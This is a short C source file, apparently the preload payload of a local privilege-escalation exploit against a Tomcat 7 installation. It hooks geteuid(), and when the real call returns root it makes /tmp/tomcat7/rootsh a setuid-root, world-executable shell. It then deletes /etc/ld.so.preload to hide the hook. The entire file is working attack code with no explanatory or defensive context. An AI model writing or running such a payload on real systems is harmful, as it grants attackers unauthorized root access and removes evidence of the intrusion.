#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h> // requires -ldl 
uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		printf("I was preloaded :)\n");
		chown("/tmp/tomcat7/rootsh", 0, 0);
		chmod("/tmp/tomcat7/rootsh", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}